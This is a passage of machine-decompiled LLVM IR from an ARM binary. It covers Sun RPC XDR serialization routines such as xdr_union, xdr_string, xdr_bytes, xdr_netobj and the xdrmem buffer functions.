  br i1 %v2_185d8, label %dec_label_pc_18638, label %dec_label_pc_185e0

dec_label_pc_185e0:                               ; preds = %dec_label_pc_185d8
  %v0_185e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_185e8 = add i32 %v0_185e0, 4
  %v2_185e8 = inttoptr i32 %v1_185e8 to i32*
  %v3_185e8 = load i32, i32* %v2_185e8, align 4
  store i32 99832, i32* @lr, align 4
  %v1_185f4 = add i32 %v3_185e8, 8
  %v2_185f4 = inttoptr i32 %v1_185f4 to i32*
  %v3_185f4 = load i32, i32* %v2_185f4, align 4
  call void @__pseudo_branch(i32 %v3_185f4)
  %v2_185f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_185f8, i32* @r4, align 4
  ret i32 %v0_185e0

dec_label_pc_18614:                               ; preds = %dec_label_pc_185b0
  %v1_18600 = add i32 %tmp, 4
  %v2_18600 = inttoptr i32 %v1_18600 to i32*
  %v3_18600 = load i32, i32* %v2_18600, align 4
  store i32 99852, i32* @lr, align 4
  %v1_18608 = add i32 %v3_18600, 12
  %v2_18608 = inttoptr i32 %v1_18608 to i32*
  %v3_18608 = load i32, i32* %v2_18608, align 4
  call void @__pseudo_branch(i32 %v3_18608)
  %v0_18614 = load i32, i32* %r5.global-to-local, align 4
  %v2_18614 = icmp eq i32 %v0_18614, 0
  br i1 %v2_18614, label %dec_label_pc_18638, label %dec_label_pc_1861c

dec_label_pc_1861c:                               ; preds = %dec_label_pc_18614
  %v0_1861c = load i32, i32* %r4.global-to-local, align 4
  %v1_18624 = add i32 %v0_1861c, 4
  %v2_18624 = inttoptr i32 %v1_18624 to i32*
  %v3_18624 = load i32, i32* %v2_18624, align 4
  store i32 99892, i32* @lr, align 4
  %v1_18630 = add i32 %v3_18624, 12
  %v2_18630 = inttoptr i32 %v1_18630 to i32*
  %v3_18630 = load i32, i32* %v2_18630, align 4
  call void @__pseudo_branch(i32 %v3_18630)
  %v2_18634 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18634, i32* @r4, align 4
  ret i32 %v0_1861c

dec_label_pc_18638:                               ; preds = %dec_label_pc_185b4, %dec_label_pc_18614, %dec_label_pc_185d8, %entry
  %v2_1863c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1863c, i32* @r4, align 4
  ret i32 1

dec_label_pc_18640:                               ; preds = %dec_label_pc_185b4
  store i32 %v3_1858c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1859c, { 1, 0 }
  uselistorder i32 %v2_18598, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18638, { 1, 2, 0, 3 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_18650 = load i32, i32* @r4, align 4
  store i32 %v3_18650, i32* %stack_var_-24, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %v0_18658 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18658, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  store i32 %arg4, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_18668 = call i32 @xdr_enum()
  %v2_1866c = icmp eq i32 %v0_18668, 0
  br i1 %v2_1866c, label %dec_label_pc_186d0, label %dec_label_pc_1868c.preheader

dec_label_pc_1868c.preheader:                     ; preds = %entry
  %v1_18670 = load i32, i32* %r5.global-to-local, align 4
  %v2_18670 = inttoptr i32 %v1_18670 to i32*
  %v3_18670 = load i32, i32* %v2_18670, align 4
  store i32 %v3_18670, i32* %r1.global-to-local, align 4
  %v0_1868c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1868c

dec_label_pc_1867c:                               ; preds = %dec_label_pc_1868c
  %v1_1867c = inttoptr i32 %v0_18684 to i32*
  %v2_1867c = load i32, i32* %v1_1867c, align 4
  %v9_18680 = icmp eq i32 %v2_1867c, %v3_18670
  %v1_18684 = add i32 %v0_18684, 8
  store i32 %v1_18684, i32* %r4.global-to-local, align 4
  br i1 %v9_18680, label %dec_label_pc_186b8, label %dec_label_pc_1868c

dec_label_pc_1868c:                               ; preds = %dec_label_pc_1868c.preheader, %dec_label_pc_1867c
  %v0_18684 = phi i32 [ %v0_1868c.pre, %dec_label_pc_1868c.preheader ], [ %v1_18684, %dec_label_pc_1867c ]
  %v1_1868c = add i32 %v0_18684, 4
  %v2_1868c = inttoptr i32 %v1_1868c to i32*
  %v3_1868c = load i32, i32* %v2_1868c, align 4
  %v2_18690 = icmp eq i32 %v3_1868c, 0
  br i1 %v2_18690, label %dec_label_pc_18698, label %dec_label_pc_1867c

dec_label_pc_18698:                               ; preds = %dec_label_pc_1868c
  %v0_18698 = load i32, i32* %r8.global-to-local, align 4
  %v2_18698 = icmp eq i32 %v0_18698, 0
  br i1 %v2_18698, label %dec_label_pc_186d0, label %dec_label_pc_186a0

dec_label_pc_186a0:                               ; preds = %dec_label_pc_18698
  %v0_186a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_186a4, i32* %r1.global-to-local, align 4
  %v1_186b0 = call i32 @unknown_0()
  %v2_186b4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_186b4, i32* %r4.global-to-local, align 4
  ret i32 %v1_186b0

dec_label_pc_186b8:                               ; preds = %dec_label_pc_1867c
  %v0_186b8 = load i32, i32* %r6.global-to-local, align 4
  %v0_186bc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_186bc, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_1868c)
  %v2_186cc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_186cc, i32* %r4.global-to-local, align 4
  ret i32 %v0_186b8

dec_label_pc_186d0:                               ; preds = %entry, %dec_label_pc_18698
  %v2_186d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_186d4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_18684, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 ()* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder label %dec_label_pc_186d0, { 1, 0 }
  uselistorder label %dec_label_pc_1868c, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_186d8 = load i32, i32* @r4, align 4
  store i32 %v3_186d8, i32* %stack_var_-20, align 4
  %v6_186d8 = load i32, i32* @r5, align 4
  %v9_186d8 = load i32, i32* @r6, align 4
  %v12_186d8 = load i32, i32* @r7, align 4
  %v2_186dc = load i32, i32* %arg1, align 4
  %v2_186e0 = icmp eq i32 %v2_186dc, 0
  %v2_186e4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v1_186f4 = inttoptr i32 %arg2 to i32*
  %v2_186f4 = load i32, i32* %v1_186f4, align 4
  store i32 %v2_186f4, i32* @r4, align 4
  br i1 %v2_186e0, label %dec_label_pc_18710, label %dec_label_pc_186fc

dec_label_pc_186fc:                               ; preds = %entry
  %v7_186fc = icmp eq i32 %v2_186dc, 2
  br i1 %v7_186fc, label %dec_label_pc_18704, label %dec_label_pc_18724

dec_label_pc_18704:                               ; preds = %dec_label_pc_186fc
  %v2_18704 = icmp eq i32 %v2_186f4, 0
  br i1 %v2_18704, label %dec_label_pc_187d4, label %dec_label_pc_18718

dec_label_pc_18710:                               ; preds = %entry
  %v2_18710 = icmp eq i32 %v2_186f4, 0
  br i1 %v2_18710, label %dec_label_pc_187dc, label %dec_label_pc_18718

dec_label_pc_18718:                               ; preds = %dec_label_pc_18704, %dec_label_pc_18710
  %v1_18718 = inttoptr i32 %v2_186f4 to i8*
  store i32 %v2_186f4, i32* %r0.global-to-local, align 4
  %v3_1871c = call i32 @strlen(i8* %v1_18718)
  store i32 %v3_1871c, i32* %r0.global-to-local, align 4
  store i32 %v3_1871c, i32* %stack_var_-24, align 4
  %v0_18724.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18724

dec_label_pc_18724:                               ; preds = %dec_label_pc_186fc, %dec_label_pc_18718
  %v0_18724 = phi i32 [ %tmp, %dec_label_pc_186fc ], [ %v0_18724.pre, %dec_label_pc_18718 ]
  store i32 %v0_18724, i32* @r0, align 4
  store i32 %v2_186e4, i32* @r1, align 4
  %v2_1872c = inttoptr i32 %v0_18724 to i32*
  %v4_1872c = call i32 @xdr_u_int(i32* %v2_1872c, i32* nonnull %stack_var_-24)
  store i32 %v4_1872c, i32* %r0.global-to-local, align 4
  %v2_18730 = icmp eq i32 %v4_1872c, 0
  br i1 %v2_18730, label %dec_label_pc_187dc, label %dec_label_pc_18738

dec_label_pc_18738:                               ; preds = %dec_label_pc_18724
  %v2_18738 = load i32, i32* %stack_var_-24, align 4
  %v1_1873c = load i32, i32* @r7, align 4
  %tmp14 = icmp ugt i32 %v2_18738, %v1_1873c
  br i1 %tmp14, label %dec_label_pc_187dc, label %dec_label_pc_18744

dec_label_pc_18744:                               ; preds = %dec_label_pc_18738
  %v0_18744 = load i32, i32* @r5, align 4
  %v1_18744 = inttoptr i32 %v0_18744 to i32*
  %v2_18744 = load i32, i32* %v1_18744, align 4
  %v7_18748 = icmp eq i32 %v2_18744, 1
  br i1 %v7_18748, label %dec_label_pc_18760, label %dec_label_pc_18750

dec_label_pc_18750:                               ; preds = %dec_label_pc_18744
  %v2_18748 = icmp eq i32 %v2_18744, 0
  br i1 %v2_18748, label %dec_label_pc_187a8, label %dec_label_pc_18754

dec_label_pc_18754:                               ; preds = %dec_label_pc_18750
  %v7_18754 = icmp eq i32 %v2_18744, 2
  br i1 %v7_18754, label %dec_label_pc_187bc, label %dec_label_pc_187dc

dec_label_pc_18760:                               ; preds = %dec_label_pc_18744
  %v1_18760 = add i32 %v2_18738, 1
  store i32 %v1_18760, i32* %r0.global-to-local, align 4
  %v7_18760 = icmp eq i32 %v1_18760, 0
  br i1 %v7_18760, label %dec_label_pc_187d4, label %dec_label_pc_18768

dec_label_pc_18768:                               ; preds = %dec_label_pc_18760
  %v0_18768 = load i32, i32* @r4, align 4
  %v2_18768 = icmp eq i32 %v0_18768, 0
  br i1 %v2_18768, label %dec_label_pc_18770, label %dec_label_pc_1879c

dec_label_pc_18770:                               ; preds = %dec_label_pc_18768
  %v1_18770 = call i32 @malloc(i32 %v1_18760)
  store i32 %v1_18770, i32* %r0.global-to-local, align 4
  %v2_18774 = icmp eq i32 %v1_18770, 0
  store i32 %v1_18770, i32* @r4, align 4
  %v1_1877c = load i32, i32* @r6, align 4
  %v2_1877c = inttoptr i32 %v1_1877c to i32*
  store i32 %v1_18770, i32* %v2_1877c, align 4
  br i1 %v2_18774, label %dec_label_pc_18784, label %dec_label_pc_18770.dec_label_pc_1879c_crit_edge

dec_label_pc_18770.dec_label_pc_1879c_crit_edge:  ; preds = %dec_label_pc_18770
  %v2_1879c.pre = load i32, i32* %stack_var_-24, align 4
  %v2_187a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1879c

dec_label_pc_18784:                               ; preds = %dec_label_pc_18770
  store i32 ptrtoint ([27 x i8]* @global_var_1dd44.909 to i32), i32* %r0.global-to-local, align 4
  %v2_1878c = load i32, i32* @global_var_2a890, align 4
  %v3_18790 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_1dd44.909 to i32), i32 %v2_1878c)
  %v0_18794 = load i32, i32* @r4, align 4
  store i32 %v0_18794, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_187e0

dec_label_pc_1879c:                               ; preds = %dec_label_pc_18770.dec_label_pc_1879c_crit_edge, %dec_label_pc_18768
  %v2_187a4 = phi i32 [ %v2_187a4.pre, %dec_label_pc_18770.dec_label_pc_1879c_crit_edge ], [ %v0_18768, %dec_label_pc_18768 ]
  %v2_1879c = phi i32 [ %v2_1879c.pre, %dec_label_pc_18770.dec_label_pc_1879c_crit_edge ], [ %v2_18738, %dec_label_pc_18768 ]
  %v4_187a4 = add i32 %v2_1879c, %v2_187a4
  %v5_187a4 = inttoptr i32 %v4_187a4 to i8*
  store i8 0, i8* %v5_187a4, align 1
  %v0_187a8.pre = load i32, i32* @r5, align 4
  %v2_187b0.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_187a8

dec_label_pc_187a8:                               ; preds = %dec_label_pc_18750, %dec_label_pc_1879c
  %v2_187b0 = phi i32 [ %v2_18738, %dec_label_pc_18750 ], [ %v2_187b0.pre, %dec_label_pc_1879c ]
  %v0_187a8 = phi i32 [ %v0_18744, %dec_label_pc_18750 ], [ %v0_187a8.pre, %dec_label_pc_1879c ]
  store i32 %v0_187a8, i32* %r0.global-to-local, align 4
  %v0_187ac = load i32, i32* @r4, align 4
  %v3_187b4 = inttoptr i32 %v0_187a8 to i32*
  %v4_187b4 = call i32 @xdr_opaque(i32* %v3_187b4, i32 %v0_187ac, i32 %v2_187b0)
  store i32 %v4_187b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_187e0

dec_label_pc_187bc:                               ; preds = %dec_label_pc_18754
  %v0_187bc = load i32, i32* @r4, align 4
  store i32 %v0_187bc, i32* @r0, align 4
  %v0_187c0 = call i32 @free()
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_187cc = load i32, i32* @r6, align 4
  %v2_187cc = inttoptr i32 %v1_187cc to i32*
  store i32 0, i32* %v2_187cc, align 4
  %v17_187e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_187e0

dec_label_pc_187d4:                               ; preds = %dec_label_pc_18704, %dec_label_pc_18760
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_187e0

dec_label_pc_187dc:                               ; preds = %dec_label_pc_18754, %dec_label_pc_18738, %dec_label_pc_18724, %dec_label_pc_18710
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_187e0

dec_label_pc_187e0:                               ; preds = %dec_label_pc_187d4, %dec_label_pc_187bc, %dec_label_pc_187a8, %dec_label_pc_18784, %dec_label_pc_187dc
  %v17_187e4 = phi i32 [ 1, %dec_label_pc_187d4 ], [ %v17_187e4.pre, %dec_label_pc_187bc ], [ %v4_187b4, %dec_label_pc_187a8 ], [ %v0_18794, %dec_label_pc_18784 ], [ 0, %dec_label_pc_187dc ]
  %v2_187e4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_187e4, i32* @r4, align 4
  store i32 %v6_186d8, i32* @r5, align 4
  store i32 %v9_186d8, i32* @r6, align 4
  store i32 %v12_186d8, i32* @r7, align 4
  ret i32 %v17_187e4

; uselistorder directives
  uselistorder i32 %v0_187a8, { 1, 0 }
  uselistorder i32 %v1_18770, { 1, 0, 2, 3 }
  uselistorder i32 %v2_18744, { 0, 2, 1 }
  uselistorder i32 %v2_18738, { 1, 2, 3, 0 }
  uselistorder i32 %v0_18724, { 1, 0 }
  uselistorder i32 %v2_186f4, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-24, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 8, 7, 10, 9, 11, 13, 12, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_187e0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_187d4, { 1, 0 }
  uselistorder label %dec_label_pc_187a8, { 1, 0 }
  uselistorder label %dec_label_pc_18724, { 1, 0 }
  uselistorder label %dec_label_pc_18718, { 1, 0 }
}

define i32 @xdr_wrapstring() local_unnamed_addr {
entry:
  %v0_187f8 = load i32, i32* @r0, align 4
  %v1_187f8 = load i32, i32* @r1, align 4
  %v3_187f8 = inttoptr i32 %v0_187f8 to i32*
  %v4_187f8 = call i32 @__GI_xdr_string(i32* %v3_187f8, i32 %v1_187f8, i32 -1)
  %v2_187fc = icmp eq i32 %v4_187f8, 0
  br i1 %v2_187fc, label %bb3, label %bb

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_18804 = phi i32 [ 0, %entry ], [ 1, %bb ]
  ret i32 %v5_18804

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_18808 = load i32, i32* @r4, align 4
  store i32 %v3_18808, i32* %stack_var_-24, align 4
  %v6_18808 = load i32, i32* @r5, align 4
  %v9_18808 = load i32, i32* @r6, align 4
  %v12_18808 = load i32, i32* @r7, align 4
  %v15_18808 = load i32, i32* @r8, align 4
  %v18_18808 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r1, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %tmp, i32* @r6, align 4
  %v1_18820 = inttoptr i32 %arg2 to i32*
  %v2_18820 = load i32, i32* %v1_18820, align 4
  store i32 %v2_18820, i32* @r4, align 4
  %v2_18824 = inttoptr i32 %arg3 to i32*
  %v4_18824 = call i32 @xdr_u_int(i32* %v2_18824, i32* %v2_18824)
  %v2_18828 = icmp eq i32 %v4_18824, 0
  br i1 %v2_18828, label %dec_label_pc_188d8, label %dec_label_pc_18830

dec_label_pc_18830:                               ; preds = %entry
  %v0_18830 = load i32, i32* @r5, align 4
  %v1_18830 = inttoptr i32 %v0_18830 to i32*
  %v2_18830 = load i32, i32* %v1_18830, align 4
  store i32 %v2_18830, i32* @r5, align 4
  %v1_18834 = load i32, i32* @r7, align 4
  %tmp11 = icmp ugt i32 %v2_18830, %v1_18834
  %v0_18848.pre = load i32, i32* @r6, align 4
  %.pre = inttoptr i32 %v0_18848.pre to i32*
  br i1 %tmp11, label %dec_label_pc_1883c, label %dec_label_pc_18848

dec_label_pc_1883c:                               ; preds = %dec_label_pc_18830
  %v2_1883c = load i32, i32* %.pre, align 4
  %v7_18840 = icmp eq i32 %v2_1883c, 2
  br i1 %v7_18840, label %dec_label_pc_18848, label %dec_label_pc_188d8

dec_label_pc_18848:                               ; preds = %dec_label_pc_18830, %dec_label_pc_1883c
  %v2_18848 = load i32, i32* %.pre, align 4
  %v7_1884c = icmp eq i32 %v2_18848, 1
  br i1 %v7_1884c, label %dec_label_pc_18864, label %dec_label_pc_18854

dec_label_pc_18854:                               ; preds = %dec_label_pc_18848
  %v2_1884c = icmp eq i32 %v2_18848, 0
  br i1 %v2_1884c, label %dec_label_pc_188a4, label %dec_label_pc_18858

dec_label_pc_18858:                               ; preds = %dec_label_pc_18854
  %v7_18858 = icmp eq i32 %v2_18848, 2
  br i1 %v7_18858, label %dec_label_pc_188b8, label %dec_label_pc_188d8

dec_label_pc_18864:                               ; preds = %dec_label_pc_18848
  %v2_18864 = icmp eq i32 %v2_18830, 0
  br i1 %v2_18864, label %dec_label_pc_188e0, label %dec_label_pc_1886c

dec_label_pc_1886c:                               ; preds = %dec_label_pc_18864
  %v0_1886c = load i32, i32* @r4, align 4
  %v2_1886c = icmp eq i32 %v0_1886c, 0
  br i1 %v2_1886c, label %dec_label_pc_18874, label %dec_label_pc_188a4

dec_label_pc_18874:                               ; preds = %dec_label_pc_1886c
  %v1_18878 = call i32 @malloc(i32 %v2_18830)
  %v2_1887c = icmp eq i32 %v1_18878, 0
  store i32 %v1_18878, i32* @r4, align 4
  %v1_18884 = load i32, i32* @r8, align 4
  %v2_18884 = inttoptr i32 %v1_18884 to i32*
  store i32 %v1_18878, i32* %v2_18884, align 4
  br i1 %v2_1887c, label %dec_label_pc_1888c, label %dec_label_pc_18874.dec_label_pc_188a4_crit_edge

dec_label_pc_18874.dec_label_pc_188a4_crit_edge:  ; preds = %dec_label_pc_18874
  %v0_188a4.pre = load i32, i32* @r6, align 4
  %v0_188ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_188a4

dec_label_pc_1888c:                               ; preds = %dec_label_pc_18874
  %v2_18894 = load i32, i32* @global_var_2a890, align 4
  %v3_18898 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1dd60.912 to i32), i32 %v2_18894)
  %v0_1889c = load i32, i32* @r4, align 4
  %v2_188a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_188a0, i32* @r4, align 4
  store i32 %v6_18808, i32* @r5, align 4
  store i32 %v9_18808, i32* @r6, align 4
  store i32 %v12_18808, i32* @r7, align 4
  store i32 %v15_18808, i32* @r8, align 4
  ret i32 %v0_1889c

dec_label_pc_188a4:                               ; preds = %dec_label_pc_18854, %dec_label_pc_18874.dec_label_pc_188a4_crit_edge, %dec_label_pc_1886c
  %v0_188ac = phi i32 [ %v0_188ac.pre, %dec_label_pc_18874.dec_label_pc_188a4_crit_edge ], [ %v2_18830, %dec_label_pc_1886c ], [ %v2_18830, %dec_label_pc_18854 ]
  %v0_188a4 = phi i32 [ %v0_188a4.pre, %dec_label_pc_18874.dec_label_pc_188a4_crit_edge ], [ %v0_18848.pre, %dec_label_pc_1886c ], [ %v0_18848.pre, %dec_label_pc_18854 ]
  %v0_188a8 = load i32, i32* @r4, align 4
  %v2_188b0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_188b0, i32* @r4, align 4
  store i32 %v6_18808, i32* @r5, align 4
  store i32 %v9_18808, i32* @r6, align 4
  store i32 %v12_18808, i32* @r7, align 4
  store i32 %v15_18808, i32* @r8, align 4
  store i32 %v18_18808, i32* @lr, align 4
  %v3_188b4 = inttoptr i32 %v0_188a4 to i32*
  %v4_188b4 = call i32 @xdr_opaque(i32* %v3_188b4, i32 %v0_188a8, i32 %v0_188ac)
  br label %dec_label_pc_188b8

dec_label_pc_188b8:                               ; preds = %dec_label_pc_18858, %dec_label_pc_188a4
  %v0_188b8 = load i32, i32* @r4, align 4
  %v2_188b8 = icmp eq i32 %v0_188b8, 0
  br i1 %v2_188b8, label %dec_label_pc_188e0, label %dec_label_pc_188c0

dec_label_pc_188c0:                               ; preds = %dec_label_pc_188b8
  store i32 %v0_188b8, i32* @r0, align 4
  %v0_188c4 = call i32 @free()
  %v1_188d0 = load i32, i32* @r8, align 4
  %v2_188d0 = inttoptr i32 %v1_188d0 to i32*
  store i32 0, i32* %v2_188d0, align 4
  %v2_188d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_188d4, i32* @r4, align 4
  store i32 %v6_18808, i32* @r5, align 4
  store i32 %v9_18808, i32* @r6, align 4
  store i32 %v12_18808, i32* @r7, align 4
  store i32 %v15_18808, i32* @r8, align 4
  ret i32 1

dec_label_pc_188d8:                               ; preds = %dec_label_pc_18858, %dec_label_pc_1883c, %entry
  %v2_188dc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_188dc, i32* @r4, align 4
  store i32 %v6_18808, i32* @r5, align 4
  store i32 %v9_18808, i32* @r6, align 4
  store i32 %v12_18808, i32* @r7, align 4
  store i32 %v15_18808, i32* @r8, align 4
  ret i32 0

dec_label_pc_188e0:                               ; preds = %dec_label_pc_188b8, %dec_label_pc_18864
  %v2_188e4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_188e4, i32* @r4, align 4
  store i32 %v6_18808, i32* @r5, align 4
  store i32 %v9_18808, i32* @r6, align 4
  store i32 %v12_18808, i32* @r7, align 4
  store i32 %v15_18808, i32* @r8, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_18878, { 1, 0, 2 }
  uselistorder i32 %v2_18848, { 0, 2, 1 }
  uselistorder i32 %v0_18848.pre, { 2, 1, 0 }
  uselistorder i32 %v2_18830, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v15_18808, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v12_18808, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v9_18808, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v6_18808, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32*, i32, i32)* @xdr_opaque, { 1, 2, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_188b8, { 1, 0 }
  uselistorder label %dec_label_pc_188a4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18848, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1) local_unnamed_addr {
entry:
  %v1_188f8 = add i32 %arg1, 4
  %v0_188fc = load i32, i32* @r0, align 4
  %v4_188fc = inttoptr i32 %v0_188fc to i32*
  %v5_188fc = call i32 @xdr_bytes(i32* %v4_188fc, i32 %v1_188f8, i32 %arg1, i32 1024)
  ret i32 %v5_188fc
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg4, i32* %arg1, align 4
  store i32 ptrtoint (i32* @global_var_1dd80.914 to i32), i32* %r3.global-to-local, align 4
  %v2_18908 = add i32 %tmp, 20
  %v3_18908 = inttoptr i32 %v2_18908 to i32*
  store i32 %arg3, i32* %v3_18908, align 4
  %v0_1890c = load i32, i32* %r3.global-to-local, align 4
  %v2_1890c = add i32 %tmp, 4
  %v3_1890c = inttoptr i32 %v2_1890c to i32*
  store i32 %v0_1890c, i32* %v3_1890c, align 4
  %v2_18910 = add i32 %tmp, 12
  %v3_18910 = inttoptr i32 %v2_18910 to i32*
  store i32 %arg2, i32* %v3_18910, align 4
  %v2_18914 = add i32 %tmp, 16
  %v3_18914 = inttoptr i32 %v2_18914 to i32*
  store i32 %arg2, i32* %v3_18914, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v1_18920 = load i32, i32* @r0, align 4
  ret i32 %v1_18920
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_18928 = add i32 %arg1, 20
  %v2_18928 = inttoptr i32 %v1_18928 to i32*
  %v3_18928 = load i32, i32* %v2_18928, align 4
  store i32 %v3_18928, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %tmp4 = icmp ult i32 %v3_18928, 4
  br i1 %tmp4, label %dec_label_pc_1897c, label %dec_label_pc_18940

dec_label_pc_18940:                               ; preds = %entry
  %v1_18930 = add i32 %v3_18928, -4
  %v1_18940 = add i32 %arg1, 12
  %v2_18940 = inttoptr i32 %v1_18940 to i32*
  %v3_18940 = load i32, i32* %v2_18940, align 4
  store i32 %v3_18940, i32* %r3.global-to-local, align 4
  store i32 %v1_18930, i32* %v2_18928, align 4
  %v0_18948 = load i32, i32* %r3.global-to-local, align 4
  %v1_18948 = inttoptr i32 %v0_18948 to i32*
  %v2_18948 = load i32, i32* %v1_18948, align 4
  %v2_18964 = call i32 @llvm.bswap.i32(i32 %v2_18948)
  store i32 %v2_18964, i32* %r3.global-to-local, align 4
  %v1_18968 = load i32, i32* %ip.global-to-local, align 4
  %v2_18968 = inttoptr i32 %v1_18968 to i32*
  store i32 %v2_18964, i32* %v2_18968, align 4
  %v3_1896c = load i32, i32* %v2_18940, align 4
  %v1_18970 = add i32 %v3_1896c, 4
  store i32 %v1_18970, i32* %r3.global-to-local, align 4
  store i32 %v1_18970, i32* %v2_18940, align 4
  br label %dec_label_pc_1897c

dec_label_pc_1897c:                               ; preds = %entry, %dec_label_pc_18940
  %v0_1897c = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18940 ]
  ret i32 %v0_1897c

; uselistorder directives
  uselistorder i32 %v2_18964, { 1, 0 }
  uselistorder i32* %v2_18940, { 1, 0, 2 }
  uselistorder i32 %v3_18928, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1897c, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_18984 = add i32 %arg1, 20
  %v2_18984 = inttoptr i32 %v1_18984 to i32*
  %v3_18984 = load i32, i32* %v2_18984, align 4
  %tmp = icmp ult i32 %v3_18984, 4
  br i1 %tmp, label %dec_label_pc_189d4, label %dec_label_pc_18998

dec_label_pc_18998:                               ; preds = %entry
  %v1_1898c = add i32 %v3_18984, -4
  store i32 %v1_1898c, i32* %v2_18984, align 4
  %v2_1899c = load i32, i32* %arg2, align 4
  %v1_189b8 = add i32 %arg1, 12
  %v2_189b8 = inttoptr i32 %v1_189b8 to i32*
